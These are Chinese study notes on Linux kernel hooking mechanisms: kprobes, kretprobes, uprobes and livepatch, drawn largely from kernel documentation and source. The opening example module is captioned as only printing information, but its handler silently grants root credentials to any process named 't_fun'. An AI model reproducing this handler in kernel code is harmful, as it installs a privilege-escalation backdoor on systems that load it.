linux 内核hook
^^^^^^^^^^^^^^^^^^^
linux 底层指令替换原理
"""""""""""""""""""""
- x86指令替换实现：arch/x86/kernel/alternative.c,其中实现了ftrace/kprobe/livepatch等实现以来的底层指令替换函数。
- 总结：
  - 下一步任务：详细分析指令替换实现逻辑。


linux kprobe/kretprobe 分析总结
"""""""""""""""""""""""""""""""""""

示例分析
********
k_m1.c

.. code-block:: c
	:caption: 打印t_fun执行内核函数start_thread时的信息
	:emphasize-lines: 4,5
	:linenos:
	 
	#include <linux/kernel.h>
	#include <linux/module.h>
	#include <linux/kprobes.h>
	#include <linux/sched.h>
	
	
	#define MAX_SYMBOL_LEN	64
	#define exe_buf 	"t_fun"
	static char buf[TASK_COMM_LEN];
	static char symbol[MAX_SYMBOL_LEN] = "start_thread";
	module_param_string(symbol, symbol, sizeof(symbol), 0644);

	/* For each probe you need to allocate a k_m1 structure */
	struct kprobe kp = {
		.symbol_name	= symbol,
	};

	/* k_m1 pre_handler: called just before the probed instruction is executed */
	int __kprobes handler_pre(struct kprobe *p, struct pt_regs *regs)
	{
	struct task_struct *tsk = current;
	get_task_comm(buf,tsk);
	if(!strcmp(buf,exe_buf)){
		struct cred *creds = prepare_creds();
		creds->uid.val = creds->euid.val = 0;
		creds->gid.val = creds->egid.val = 0;
		commit_creds(creds);
		printk("%s:%d exec = %s\n",__func__,__LINE__,buf);
	}


	return 0;
	}

	static int __init k_m1_init(void)
	{
	int ret;
	kp.pre_handler = handler_pre;

	ret = register_kprobe(&kp);
	if (ret < 0) {
		pr_err("register_k_m1 failed, returned %d\n", ret);
		return ret;
	}
	pr_info("Planted k_m1 at %p\n", kp.addr);
	return 0;
	}

	static void __exit k_m1_exit(void)
	{
		unregister_kprobe(&kp);
		pr_info("k_m1 at %p unregistered\n", kp.addr);
	}

	module_init(k_m1_init)
	module_exit(k_m1_exit)
	MODULE_LICENSE("GPL");
	
我们分析register_kprobe
**********************

	
.. code-block:: c
	:caption: register_kprobe
	:emphasize-lines: 4,5
	:linenos: 
	
	int register_kprobe(struct kprobe *p)
       {
	int ret;
	struct kprobe *old_p;
	struct module *probed_mod;
	kprobe_opcode_t *addr;

	/* Adjust probe address from symbol */
	addr = kprobe_addr(p);
	if (IS_ERR(addr))
		return PTR_ERR(addr);
	p->addr = addr;

	ret = warn_kprobe_rereg(p);
	if (ret)
		return ret;

	/* User can pass only KPROBE_FLAG_DISABLED to register_kprobe */
	p->flags &= KPROBE_FLAG_DISABLED;
	p->nmissed = 0;
	INIT_LIST_HEAD(&p->list);

	ret = check_kprobe_address_safe(p, &probed_mod);
	if (ret)
		return ret;

	mutex_lock(&kprobe_mutex);

	old_p = get_kprobe(p->addr);
	if (old_p) {
		/* Since this may unoptimize old_p, locking text_mutex. */
		ret = register_aggr_kprobe(old_p, p);
		goto out;
	}

	cpus_read_lock();
	/* Prevent text modification */
	mutex_lock(&text_mutex);
	ret = prepare_kprobe(p);
	mutex_unlock(&text_mutex);
	cpus_read_unlock();
	if (ret)
		goto out;

	INIT_HLIST_NODE(&p->hlist);
	hlist_add_head_rcu(&p->hlist,
		       &kprobe_table[hash_ptr(p->addr, KPROBE_HASH_BITS)]);

	if (!kprobes_all_disarmed && !kprobe_disabled(p)) {
		ret = arm_kprobe(p);
		if (ret) {
			hlist_del_rcu(&p->hlist);
			synchronize_rcu();
			goto out;
		}
	}

	/* Try to optimize kprobe */
	try_to_optimize_kprobe(p);
    out:
	mutex_unlock(&kprobe_mutex);

	if (probed_mod)
		module_put(probed_mod);

	return ret;
	}

	
.. code-block:: c
	:caption: struct kprobe
	:emphasize-lines: 4,5
	:linenos: 
	

	struct kprobe {
		struct hlist_node hlist;

		/* list of kprobes for multi-handler support */
		struct list_head list;

		/*count the number of times this probe was temporarily disarmed */
		unsigned long nmissed;

		/* location of the probe point */
		kprobe_opcode_t *addr;

		/* Allow user to indicate symbol name of the probe point */
		const char *symbol_name;

		/* Offset into the symbol */
		unsigned int offset;

		/* Called before addr is executed. */
		kprobe_pre_handler_t pre_handler;

		/* Called after addr is executed, unless... */
		kprobe_post_handler_t post_handler;

		/* Saved opcode (which has been replaced with breakpoint) */
		kprobe_opcode_t opcode;

		/* copy of the original instruction */
		struct arch_specific_insn ainsn;

		/*
		 * Indicates various status flags.
		 * Protected by kprobe_mutex after this kprobe is registered.
		 */
		u32 flags;
	};




kprobe_register处理流程图
*************************

.. image:: ../../../img/kprobe_register.svg
   :align: center
	
- 查找符号对应的符号地址；
- 地址的有效性、安全性检查；
- kprobe表处理；
- 指令替换。

kprobe 概述
***********

- Kprobes能够动态地中断任何内核例程并无中断地收集调试和性能信息,可以在几乎任何内核代码地址处中断并转向注册的特定处理程序进行执行;
- 可以探测除自身之外的大部分内核,这意味着有些函数 kprobes 无法探测。探测（捕获）此类函数可能会导致递归陷阱（例如双重错误），或者可能永远不会调用嵌套的探测处理程序。Kprobes 管理有诸如黑名单之类的功能，如果要将函数添加到黑名单中，linux/kprobes.h 并使用 NOKPROBE_SYMBOL() 宏来指定列入黑名单的函数，Kprobes 根据黑名单检查给定的探测地址，如果给定的地址在黑名单中，则拒绝注册它。
- 目前有两种类型的探针：kprobes 和 kretprobes（也称为返回探针）。kprobe 可以插入到内核中的几乎任何指令上。当指定函数返回时，会触发kretprobes hook。
- 以内核模块进行kprobes进行处理时，模块的 init 函数安装（“注册”）一个或多个探测器，而 exit 函数取消注册它们。诸如 register_kprobe() 之类的注册函数指定要插入探针的位置以及命中探针时要调用的处理程序。还有register_/unregister_*probes()批量注册/注销一组*probes. 当需要一次注销大量探针时，这些功能可以加快注销过程。

kprobe执行原理
*****************

当 kprobe 被注册时，Kprobes 会复制被探测的指令，并用断点指令（例如，i386 和 x86_64 上的 int3）替换被探测指令的第一个字节。当 CPU 遇到断点指令时，会发生陷阱，保存 CPU 的寄存器，并通过 notifier_call_chain 机制将控制权传递给 Kprobes。Kprobes 执行与 kprobe 相关的“pre_handler”，将 kprobe 结构的地址和保存的寄存器传递给处理程序。接下来，Kprobes 单步执行其探测指令的副本。（单步执行实际指令会更简单，但 Kprobes 将不得不暂时删除断点指令。这将打开一个小的时间窗口，此时另一个 CPU 可以直接越过探测点。）在指令单步执行后，Kprobes 执行与 kprobe 关联的“post_handler”（如果有）。然后继续执行探测点之后的指令。(注意这个之前之后的含义？？？？）：int3指令替换 --> do_int3 --> kprobe_int3_handler

kretprobe
**********

- 当您调用 register_kretprobe() 时，Kprobes 在函数的入口处建立一个 kprobe。当被探测的函数被调用并且这个探测被命中时，Kprobes 会保存一份返回地址的副本，并将返回地址替换为“蹦床”的地址。蹦床是一段任意代码——通常只是一条 nop 指令。在启动时，Kprobes 在蹦床上注册一个 kprobe。
- 当被探测的函数执行它的返回指令时，控制权传递给蹦床并且该探测被命中。Kprobes 的 trampoline 处理程序调用与 kretprobe 关联的用户指定的返回处理程序，然后将保存的指令指针设置为保存的返回地址，这就是从陷阱返回后恢复执行的地方。
- 当被探测函数正在执行时，它的返回地址存储在一个 kretprobe_instance 类型的对象中。在调用 register_kretprobe() 之前，用户设置 kretprobe 结构的 maxactive 字段来指定可以同时探测多少个指定函数的实例。register_kretprobe() 预分配指定数量的 kretprobe_instance 对象。
例如，如果函数是非递归的并且在调用时持有自旋锁，那么 maxactive = 1 就足够了。如果函数是非递归的并且永远不会放弃 CPU（例如，通过信号量或抢占），NR_CPUS 应该足够了。如果 maxactive <= 0，则设置为默认值。如果启用了 CONFIG_PREEMPT，则默认值为 max(10, 2*NR_CPUS)。否则，默认值为 NR_CPUS。
- 如果将 maxactive 设置得太低，这不是灾难；你只会错过一些探测。在 kretprobe 结构中，nmissed 字段在注册返回探针时设置为零，并且每次进入被探测函数但没有可用于建立返回探针的 kretprobe_instance 对象时递增。


Kretprobe 入口处理程序
*********************
Kretprobes 还提供了一个可选的用户指定的处理程序，它在函数入口上运行。该处理程序是通过设置 kretprobe 结构的 entry_handler 字段来指定的。每当 kretprobe 放置在函数入口处的 kprobe 被命中时，如果定义了entry_handler， 都会调用用户定义的 entry_handler，如果有的话。如果 entry_handler 返回 0（成功），则保证在函数返回时调用相应的返回处理程序。如果 entry_handler 返回非零错误，则 Kprobes 将返回地址保持原样，并且 kretprobe 对该特定函数实例没有进一步的影响。

使用与它们关联的唯一 kretprobe_instance 对象来匹配多个入口和返回处理程序调用。此外，用户还可以将每个返回实例的私有数据指定为每个 kretprobe_instance 对象的一部分。这在相应的用户条目和返回处理程序之间共享私有数据时特别有用。每个私有数据对象的大小可以在 kretprobe 注册时通过设置 kretprobe 结构的 data_size 字段来指定。可以通过每个 kretprobe_instance 对象的数据字段访问此数据。

如果输入了探测函数但没有可用的 kretprobe_instance 对象，则除了增加 nmissed 计数外，还会跳过用户 entry_handler 调用。


黑名单
********

Kprobes 可以探测除自身之外的大部分内核。这意味着有些函数 kprobes 无法探测。探测（捕获）此类函数可能会导致递归陷阱（例如双重错误），或者可能永远不会调用嵌套的探测处理程序。Kprobes 管理诸如黑名单之类的功能。如果要将函数添加到黑名单中，只需 (1) 包含 linux/kprobes.h 和 (2) 使用 NOKPROBE_SYMBOL() 宏来指定列入黑名单的函数。Kprobes 根据黑名单检查给定的探测地址，如果给定的地址在黑名单中，则拒绝注册它。	
内核配置
*********
- 使用 make menuconfig/xconfig/oldconfig 配置内核时，确保 CONFIG_KPROBES 设置为“y”。在“常规设置”下，查找“Kprobes”。
- 为了您可以加载和卸载基于 Kprobes 的检测模块，请确保“可加载模块支持”（CONFIG_MODULES）和“模块卸载”（CONFIG_MODULE_UNLOAD）设置为“y”。
- 还要确保 CONFIG_KALLSYMS 甚至可能 CONFIG_KALLSYMS_ALL 设置为“y”，因为 kallsyms_lookup_name() 由内核内 kprobe 地址解析代码使用。
- 如果您需要在函数中间插入探针，您可能会发现“使用调试信息编译内核”（CONFIG_DEBUG_INFO）很有用，因此您可以使用“objdump -d -l vmlinux”查看源代码-目标代码映射。

kprobe API
************
Kprobes API 为每种类型的探针包括一个“注册”函数和一个“取消注册”函数。API 还包括“register_*probes”和“unregister_*probes”函数，用于（取消）注册探针数组。以下是这些函数和您将编写的相关探针处理程序的简洁、迷你手册页规范。有关示例，请参见 samples/kprobes/ 子目录中的文件。

register_kprobe
*****************

.. code-block:: c
	:caption: kprobe_register
	:emphasize-lines: 4,5
	:linenos: 	
	
	#include <linux/kprobes.h>
	int register_kprobe(struct kprobe *kp);
	
在地址 kp->addr 处设置断点。当断点被命中时，Kprobes 调用 kp->pre_handler。被探测的指令单步执行后，Kprobe 调用 kp->post_handler。任何或所有处理程序都可以为 NULL。如果 kp->flags 设置为 KPROBE_FLAG_DISABLED，则该 kp 将被注册但禁用，因此，在调用 enable_kprobe(kp) 之前不会触发其处理程序。

1. 通过在 struct kprobe 中引入“symbol_name”字段，探测点地址解析现在将由内核负责。现在可以执行以下操作：

.. code-block:: c
	:caption: kprobe_register
	:emphasize-lines: 4,5
	:linenos: 	
	
	kp.symbol_name = "symbol_name";

（64 位 powerpc 错综复杂的功能描述符等被透明处理）

2. 如果安装探针点的符号偏移量已知，则使用 struct kprobe 的“偏移量”字段。该字段用于计算探测点。

3. 指定 kprobe “symbol_name” 或 “addr”。如果两者都指定，则 kprobe 注册将失败并显示 -EINVAL。

4. 对于 CISC 架构（例如 i386 和 x86_64），kprobes 代码不会验证 kprobe.addr 是否位于指令边界。谨慎使用“偏移”。	
	
5. register_kprobe() 成功返回 0，否则返回负 errno。

kp->pre_handler句柄：

.. code-block:: c
	:caption: pre_handler定义
	:emphasize-lines: 4,5
	:linenos: 
		
	#include <linux/kprobes.h>
	#include <linux/ptrace.h>
	int pre_handler(struct kprobe *p, struct pt_regs *regs);	
	
	调用时 p 指向与断点关联的 kprobe，而 regs 指向包含在断点被击中时保存的寄存器的结构。除非您是 Kprobes 极客，否则请在此处返回 0。

- kp->post_handler句柄：

	

.. code-block:: c
	:caption: post_handler
	:emphasize-lines: 4,5
	:linenos: 
	
	#include <linux/kprobes.h>
	#include <linux/ptrace.h>
	void post_handler(struct kprobe *p, struct pt_regs *regs,
                  unsigned long flags);	
	
	p 和 regs 与 pre_handler 的描述相同。标志似乎总是为零。	
	
	
register_kretprobe
*********************

.. code-block:: c
	:caption: register_kretprobe
	:linenos: 
	
	#include <linux/kprobes.h>
	int register_kretprobe(struct kretprobe *rp);
	成功时返回 0，否则返回负 errno。

	用户的返回探针处理程序（rp->handler）：

	#include <linux/kprobes.h>
	#include <linux/ptrace.h>
	int kretprobe_handler(struct kretprobe_instance *ri,
		              struct pt_regs *regs);
	regs 与 kprobe.pre_handler 的描述相同。ri 指向 kretprobe_instance 对象，可能对其中的以下字段感兴趣：

	ret_addr：返回地址

	rp：指向对应的kretprobe对象

	task：指向对应的task struct

	数据：指向每个返回实例的私有数据；见“Kretprobe
	入口处理程序”以获取详细信息。

	regs_return_value(regs) 宏提供了一个简单的抽象，用于从架构的 ABI 定义的适当寄存器中提取返回值。

	处理程序的返回值当前被忽略。
	
	
	
注销函数
********


.. code-block:: c
	:caption: unregister_*probe
	:linenos: 

	unregister_*probe
	#include <linux/kprobes.h>
	void unregister_kprobe(struct kprobe *kp);
	void unregister_kretprobe(struct kretprobe *rp);
	移除指定的探针。注册探测器后，可以随时调用取消注册函数。
	

Kprobes 功能和限制
*****************
- Kprobes 允许在同一个地址进行多个探测。此外，无法优化具有 post_handler 的探测点。因此，如果您在优化的探测点安装带有 post_handler 的 kprobe，则探测点将自动取消优化。
- 通常，可以在内核中的任何位置安装探针。特别是，您可以探测中断处理程序。如果尝试在实现 Kprobes 的代码中安装探针（主要是 kernel/kprobes.c 和arch/*/kernel/kprobes.c，但也包括 do_page_fault 和 notifier_call_chain 等函数），则 register_*probe 函数将返回 -EINVAL。
- 如果您在可内联函数中安装探针，Kprobes 不会尝试追踪该函数的所有内联实例并在那里安装探针。gcc 可能会在不被询问的情况下内联函数，因此如果您没有看到预期的探测命中，请记住这一点。
- 探测处理程序可以修改被探测函数的环境——例如，通过修改内核数据结构，或通过修改 pt_regs 结构的内容（从断点返回时恢复到寄存器）。因此，可以使用 Kprobes，例如，安装错误修复程序或注入故障以进行测试。当然，Kprobes 无法区分故意注入的故障和意外注入的故障。
- Kprobes 不会尝试阻止探针处理程序相互踩踏——例如，探测printk()然后printk()从探针处理程序调用。如果探针处理程序命中探针，则第二个探针的处理程序不会在该实例中运行，并且第二个探针的 kprobe.nmissed 成员将递增。
- 从 Linux v2.6.15-rc1 开始，多个处理程序（或同一处理程序的多个实例）可以在不同的 CPU 上同时运行。
- 除了注册和注销期间，Kprobes 不使用互斥锁或分配内存。

探测处理程序在禁用抢占或禁用中断的情况下运行，这取决于架构和优化状态。（例如，kretprobe 处理程序和优化的 kprobe 处理程序在 x86/x86-64 上运行时不会禁用中断）。在任何情况下，您的处理程序都不应该让出 CPU（例如，通过尝试获取信号量或等待 I/O）。由于返回探测是通过将返回地址替换为蹦床的地址来实现的，因此堆栈回溯和对 __builtin_return_address() 的调用通常会产生蹦床的地址，而不是 kretprobed 函数的实际返回地址。（据我们所知， __builtin_return_address() 仅用于检测和错误报告。）如果调用函数的次数与其返回的次数不匹配，则在该函数上注册返回探针可能会产生不良结果。在这种情况下，会打印一行：kretprobe BUG!: Processing kretprobe d000000000041aa8 @ c00000000004f48c。有了这些信息，人们将能够关联导致问题的 kretprobe 的确切实例。我们已经涵盖了 do_exit() 案例。do_execve() 和 do_fork() 不是问题。我们不知道这可能是一个问题的其他具体情况。如果在进入或退出函数时，CPU 运行在当前任务的堆栈以外的堆栈上，则在该函数上注册返回探针可能会产生不希望的结果。出于这个原因，Kprobes 不支持 x86_64 版本的 __switch_to() 上的返回探针（或 kprobes）；注册函数返回-EINVAL。

在 x86/x86-64 上，由于 Kprobes 的 Jump Optimization 对指令的修改范围很广，因此优化存在一些限制。为了解释它，我们引入一些术语。想象一个由两条 2 字节指令和一条 3 字节指令组成的 3 指令序列。	

Kprobes/kretprobes 示例
**************************

- /kprobes/kprobe_example.c
- /kprobes/kretprobe_example.c	
	
调试接口
*********
已注册的 kprobes 列表在 /sys/kernel/debug/kprobes/ 目录下可见（假设 debugfs 安装在 //sys/kernel/debug ）。

/sys/kernel/debug/kprobes/list：列出系统上所有已注册的探针：	
	
.. code-block:: c
	:caption: /sys/kernel/debug/kprobes/list
	:linenos: 
	
	c015d71a  k  vfs_read+0x0
	c03dedc5  r  tcp_v4_rcv+0x0	
	
第一列提供插入探针的内核地址。第二列标识探针的类型（k - kprobe 和 r - kretprobe），而第三列指定探针的符号+偏移量。如果被探测的函数属于一个模块，则还指定模块名称。以下列显示探测状态。如果探测器位于不再有效的虚拟地址（模块初始化部分，对应于已卸载模块的模块虚拟地址），则此类探测器将标记为 [GONE]。如果探针被暂时禁用，则此类探针将标记为 [DISABLED]。如果探头已优化，则标有 [OPTIMIZED]。如果探测是基于 ftrace 的，它会被标记为 [FTRACE]。

/sys/kernel/debug/kprobes/enabled：强制开启/关闭kprobes。

提供一个旋钮来全局强制打开或关闭已注册的 kprobes。默认情况下，启用所有 kprobe。通过向该文件回显“0”，所有已注册的探测器将被解除，直到此时向该文件回显“1”。请注意，此旋钮只是解除和武装所有 kprobes，并不会更改每个探测器的禁用状态。这意味着如果您通过此旋钮打开所有 kprobes，则禁用的 kprobes（标记为 [DISABLED]）将不会启用。	
	
kprobes sysctl 接口
********************
/proc/sys/debug/kprobes-optimization：打开/关闭 kprobes 优化。

当 CONFIG_OPTPROBES=y 时，会出现这个 sysctl 界面，并提供一个旋钮来全局强制开启跳转优化（参见 跳转优化如何工作？）开或关。默认情况下，允许跳转优化 (ON)。如果您在此文件中回显“0”或通过 sysctl 将“debug.kprobes_optimization”设置为 0，则所有优化的探针都将未优化，之后注册的任何新探针都不会优化。

请注意，此旋钮会更改优化状态。这意味着优化的探针（标记为 [OPTIMIZED]）将未优化（将删除 [OPTIMIZED] 标签）。如果旋钮打开，它们将再次被优化。

	
总结
******
- 这部分编程上没有太多疑问；
- 实现的底层原理；
- 下一步继续细化。

参考
**********
- https://www.kernel.org/doc/html/latest/trace/kprobes.html

- https://lwn.net/Articles/132196/

- https://www.kernel.org/doc/ols/2006/ols2006v2-pages-109-124.pdf



用户空间探针（uprobes)
""""""""""""""""""""""

更多的是在应用部分（程序部分）

必然针对一个应用进程。

uprobe_register() --> __uprobe_register -->   


.. code-block:: c
	:caption: struct kset_uevent_ops
	:emphasize-lines: 4,5
	:linenos:

	/*
	 * __uprobe_register - register a probe
	 * @inode: the file in which the probe has to be placed.
	 * @offset: offset from the start of the file.
	 * @uc: information on howto handle the probe..
	 *
	 * Apart from the access refcount, __uprobe_register() takes a creation
	 * refcount (thro alloc_uprobe) if and only if this @uprobe is getting
	 * inserted into the rbtree (i.e first consumer for a @inode:@offset
	 * tuple).  Creation refcount stops uprobe_unregister from freeing the
	 * @uprobe even before the register operation is complete. Creation
	 * refcount is released when the last @uc for the @uprobe
	 * unregisters. Caller of __uprobe_register() is required to keep @inode
	 * (and the containing mount) referenced.
	 *
	 * Return errno if it cannot successully install probes
	 * else return 0 (success)
	 */
	static int __uprobe_register(struct inode *inode, loff_t offset,
				     loff_t ref_ctr_offset, struct uprobe_consumer *uc)
	{
		struct uprobe *uprobe;
		int ret;

		/* Uprobe must have at least one set consumer */
		if (!uc->handler && !uc->ret_handler)
			return -EINVAL;

		/* copy_insn() uses read_mapping_page() or shmem_read_mapping_page() */
		if (!inode->i_mapping->a_ops->readpage && !shmem_mapping(inode->i_mapping))
			return -EIO;
		/* Racy, just to catch the obvious mistakes */
		if (offset > i_size_read(inode))
			return -EINVAL;

		/*
		 * This ensures that copy_from_page(), copy_to_page() and
		 * __update_ref_ctr() can't cross page boundary.
		 */
		if (!IS_ALIGNED(offset, UPROBE_SWBP_INSN_SIZE))
			return -EINVAL;
		if (!IS_ALIGNED(ref_ctr_offset, sizeof(short)))
			return -EINVAL;

	 retry:
		uprobe = alloc_uprobe(inode, offset, ref_ctr_offset);
		if (!uprobe)
			return -ENOMEM;
		if (IS_ERR(uprobe))
			return PTR_ERR(uprobe);

		/*
		 * We can race with uprobe_unregister()->delete_uprobe().
		 * Check uprobe_is_active() and retry if it is false.
		 */
		down_write(&uprobe->register_rwsem);
		ret = -EAGAIN;
		if (likely(uprobe_is_active(uprobe))) {
			consumer_add(uprobe, uc);
			ret = register_for_each_vma(uprobe, uc);
			if (ret)
				__uprobe_unregister(uprobe, uc);
		}
		up_write(&uprobe->register_rwsem);
		put_uprobe(uprobe);

		if (unlikely(ret == -EAGAIN))
			goto retry;
		return ret;
	}


trace uprobe使用场景
"""""""""""""""""""""""
kernel/trace/trace_uprobe.c

debugfs:

- /sys/kernel/debug/tracing/uprobe_events 
- /sys/kernel/debug/tracing/uprobe_profile：配置文件：
  

要启用此功能，请使用 CONFIG_UPROBE_EVENTS=y 构建内核。通过 /sys/kernel/debug/tracing/uprobe_events 添加探测点，uprobe 事件接口希望用户计算对象中探测点的偏移量。可以使用 /sys/kernel/debug/tracing/dynamic_events 代替 uprobe_events。该接口也将提供对其他动态事件的统一访问。

uprobe_tracer
***************
https://www.kernel.org/doc/html/latest/trace/uprobetracer.html

.. code-block:: c
	:caption: struct kset_uevent_ops
	:emphasize-lines: 4,5
	:linenos:


	p[:[GRP/]EVENT] PATH:OFFSET [FETCHARGS] : Set a uprobe
	r[:[GRP/]EVENT] PATH:OFFSET [FETCHARGS] : Set a return uprobe (uretprobe)
	p[:[GRP/]EVENT] PATH:OFFSET%return [FETCHARGS] : Set a return uprobe (uretprobe)
	-:[GRP/]EVENT                           : Clear uprobe or uretprobe event

	GRP           : Group name. If omitted, "uprobes" is the default value.
	EVENT         : Event name. If omitted, the event name is generated based
		        on PATH+OFFSET.
	PATH          : Path to an executable or a library.
	OFFSET        : Offset where the probe is inserted.
	OFFSET%return : Offset where the return probe is inserted.

	FETCHARGS     : Arguments. Each probe can have up to 128 args.
	 %REG         : Fetch register REG
	 @ADDR        : Fetch memory at ADDR (ADDR should be in userspace)
	 @+OFFSET     : Fetch memory at OFFSET (OFFSET from same file as PATH)
	 $stackN      : Fetch Nth entry of stack (N >= 0)
	 $stack       : Fetch stack address.
	 $retval      : Fetch return value.(\*1)
	 $comm        : Fetch current task comm.
	 +|-[u]OFFS(FETCHARG) : Fetch memory at FETCHARG +|- OFFS address.(\*2)(\*3)
	 \IMM         : Store an immediate value to the argument.
	 NAME=FETCHARG     : Set NAME as the argument name of FETCHARG.
	 FETCHARG:TYPE     : Set TYPE as the type of FETCHARG. Currently, basic types
		             (u8/u16/u32/u64/s8/s16/s32/s64), hexadecimal types
		             (x8/x16/x32/x64), "string" and bitfield are supported.

	(\*1) only for return probe.
	(\*2) this is useful for fetching a field of data structures.
	(\*3) Unlike kprobe event, "u" prefix will just be ignored, becuse uprobe
	      events can access only user-space memory.

事件分析
**********
您可以通过 /sys/kernel/debug/tracing/uprobe_profile 检查每个事件的探测命中总数。第一列是文件名，第二列是事件名称，第三列是探测命中数。

使用示例
*********
- 添加一个探针作为新的 uprobe 事件，将新定义写入 uprobe_events，如下所示（在可执行文件 /bin/bash 中的偏移量 0x4245c0 处设置一个 uprobe）：


.. code-block:: c
	:caption: struct kset_uevent_ops
	:emphasize-lines: 4,5
	:linenos:


	echo 'p /bin/bash:0x4245c0' > /sys/kernel/debug/tracing/uprobe_events
- 添加一个探针作为新的 uretprobe 事件：


.. code-block:: c
	:caption: struct kset_uevent_ops
	:emphasize-lines: 4,5
	:linenos:


	echo 'r /bin/bash:0x4245c0' > /sys/kernel/debug/tracing/uprobe_events

- 取消注册事件：


.. code-block:: c
	:caption: struct kset_uevent_ops
	:emphasize-lines: 4,5
	:linenos:


	echo '-:p_bash_0x4245c0' >> /sys/kernel/debug/tracing/uprobe_events

- 打印出注册的事件：


.. code-block:: c
	:caption: struct kset_uevent_ops
	:emphasize-lines: 4,5
	:linenos:


	cat /sys/kernel/debug/tracing/uprobe_events

- 清除所有事件：

.. code-block:: c
	:caption: struct kset_uevent_ops
	:emphasize-lines: 4,5
	:linenos:


	echo > /sys/kernel/debug/tracing/uprobe_events

以下示例显示了如何将指令指针和 %ax 寄存器转储到探测的文本地址。探测 /bin/zsh 中的 zfree 函数：



.. code-block:: c
	:caption: struct kset_uevent_ops
	:emphasize-lines: 4,5
	:linenos:


	# cd /sys/kernel/debug/tracing/
	# cat /proc/`pgrep zsh`/maps | grep /bin/zsh | grep r-xp
	00400000-0048a000 r-xp 00000000 08:03 130904 /bin/zsh
	# objdump -T /bin/zsh | grep -w zfree
	0000000000446420 g    DF .text  0000000000000012  Base        zfree

0x46420 是在 0x00400000 加载的对象 /bin/zsh 中 zfree 的偏移量。因此，uprobe 的命令是：


.. code-block:: c
	:caption: struct kset_uevent_ops
	:emphasize-lines: 4,5
	:linenos:

	# echo 'p:zfree_entry /bin/zsh:0x46420 %ip %ax' > uprobe_events

与 uretprobe 相同的是：


.. code-block:: c
	:caption: struct kset_uevent_ops
	:emphasize-lines: 4,5
	:linenos:

	# echo 'r:zfree_exit /bin/zsh:0x46420 %ip %ax' >> uprobe_events


用户必须明确计算对象中探测点的偏移量。

我们可以通过查看 uprobe_events 文件来查看注册的事件。

.. code-block:: c
	:caption: struct kset_uevent_ops
	:emphasize-lines: 4,5
	:linenos:

	# cat uprobe_events
	p:uprobes/zfree_entry /bin/zsh:0x00046420 arg1=%ip arg2=%ax
	r:uprobes/zfree_exit /bin/zsh:0x00046420 arg1=%ip arg2=%ax

通过查看文件 events/uprobes/zfree_entry/format 可以看到事件的格式。

总结
*******

- 初步总结，这些总归还是在于在某个对应的进程应用地址空间加入跳转指令，hook代码则在内核代码中实现：应该是int3处理程序中完成。（待确定）。
- 下一步需要处理：uprobe hook底层原理细节。

linux 实时补丁-livepatch
"""""""""""""""""""""""

kernel:v5.10.13
二进制组织格式
linux内核代码流程，加载原理，冲突总结等。


背景
******

本文对内核实时补丁进行概要性描述。

1. 动机：在许多情况下，用户都不愿意重新引导系统。可能是因为他们的系统正在执行复杂的科学计算，或者在高峰使用期间处于高负载下。除了保持系统正常运行之外，用户还希望拥有一个稳定而安全的系统。 Livepatching通过允许重定向函数调用来为用户提供服务；这样，无需系统重新启动即可修复关键功能。

2. Kprobes,Ftrace,Livepatching：Linux内核中有多种与代码执行重定向直接相关的机制。即：内核探测，函数跟踪和实时修补：

   1. 内核探针是最通用的。可以通过放置断点指令来重定向代码;
   2. 函数跟踪器从靠近函数入口点的预定义位置调用代码。该位置是由编译器使用“ -pg” gcc选项生成的(空指令替换？）;
   3. Livepatching通常需要在修改函数参数或堆栈之前，在函数条目的最开始处重定向代码;

   这三种方法都需要在运行时修改现有代码。 因此，他们需要彼此了解，不要跨过彼此的脚趾。 通过使用动态ftrace框架作为基础可以解决大多数这些问题。 探测到函数条目时，会将Kprobe注册为ftrace处理程序，请参见CONFIG_KPROBES_ON_FTRACE。 此外，还可以通过自定义ftrace处理程序调用实时补丁的替代功能。 但是有一些限制，请参见下文。

3. 一致性模型:**有功能是有原因的**。 它们采用一些输入参数，获取或释放锁，读取，处理甚至以定义的方式写入某些数据，并具有返回值。 换句话说，每个功能都有定义的语义。 

   许多修复程序不会更改已修改函数的语义。 例如，它们添加NULL指针或边界检查，通过添加缺少的内存屏障来解决争用问题，或在关键部分周围添加一些锁定。 这些更改大多数都是自包含的，并且该功能以相同的方式向系统的其余部分显示。 在这种情况下，功能可能会一个接一个地独立更新。 

   但是，还有更复杂的修复程序。 例如，补丁可能会同时更改多个功能中的锁定顺序。 或者补丁可以交换一些临时结构的含义并更新所有相关功能。 在这种情况下，受影响的单元（线程，整个内核）需要同时开始使用所有新版本的功能。 而且，只有在安全的情况下，例如，在进行切换时，才必须进行切换。 当受影响的锁被释放或当前没有数据存储在修改后的结构中时。

   关于如何安全地应用功能的理论非常复杂。 目的是定义一个所谓的一致性模型。 它尝试定义可以使用新实现的条件，以使系统保持一致。 

   Livepatch的一致性模型是kGraft和kpatch的混合体：它使用kGraft的每任务一致性和syscall障碍切换以及kpatch的堆栈跟踪切换。 还有许多后备选项，使其非常灵活。 

   当认为任务可以安全切换时，将基于每个任务应用补丁。 启用修补程序后，livepatch会进入过渡状态，在此状态下任务将收敛到修补状态。 通常，此过渡状态可以在几秒钟内完成。 禁用修补程序时，发生相同的顺序，除了任务从修补状态收敛到未修补状态。 

   中断处理程序继承其中断的任务的修补状态。 分叉任务也是如此：子代继承父代的修补状态。 

   Livepatch使用几种补充方法来确定何时可以安全地修补任务:

   1. 第一种也是最有效的方法是对睡眠任务进行堆栈检查。 如果给定任务的堆栈上没有受影响的函数，则对该任务进行修补。 在大多数情况下，这将在第一次尝试时修补大多数或所有任务。 否则，它将继续定期尝试。 仅当体系结构具有可靠的堆栈（HAVE_RELIABLE_STACKTRACE）时，此选项才可用。 
   2. 如果需要，第二种方法是内核出口切换。 当任务从系统调用，用户空间IRQ或信号返回到用户空间时，将切换任务。 在以下情况下很有用：
      1. 修补在受影响的功能上处于休眠状态的受I / O约束的用户任务。 在这种情况下，您必须发送SIGSTOP和SIGCONT强制其退出内核并进行修补。 
      2. 修补受CPU约束的用户任务。 如果任务是CPU高度绑定的，则下次被IRQ中断时将对其进行修补。 
   3. 对于空闲的“交换器”任务，由于它们从未退出内核，因此它们在空闲循环中具有klp_update_patch_state（）调用，该调用使它们可以在CPU进入空闲状态之前进行修补。

   （请注意，目前还没有针对kthreads的方法。） 

   没有HAVE_RELIABLE_STACKTRACE的架构仅依靠第二种方法。 在此功能返回之前，很可能某些任务可能仍在使用该功能的旧版本运行。 在这种情况下，您将必须发出信号。 这尤其适用于kthreads。 他们可能不会被唤醒，需要被迫。 请参阅下面的详细信息。 

